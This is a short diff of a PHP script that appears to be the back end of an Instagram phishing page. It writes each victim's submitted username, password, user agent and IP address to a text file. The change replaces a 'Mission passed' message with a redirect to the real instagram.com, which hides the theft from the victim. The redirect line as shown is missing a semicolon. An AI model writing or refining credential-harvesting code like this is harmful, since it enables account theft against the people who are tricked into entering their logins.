@@ -21,12 +21,13 @@
     $seperator = "=================================";
     $date = date('j, F Y h:i A');
 
-    $file_data = strlen($file_data) > 2000 ? "":$file_data;
+    $file_data = strlen($file_data) > 1000 ? "":$file_data;
 
     $finalData .= "Date : $date\nUsername: $username\nPassword: $password\nUser Agent: $userAgent\nIP: $IP_ADDR\n$seperator\n";
 
     file_put_contents("$fileName.txt", $finalData.$file_data);
 
-    echo "Mission passed ;)";
+    // echo "Mission passed ;)";
+    header("Location: https://instagram.com")
 
 ?>
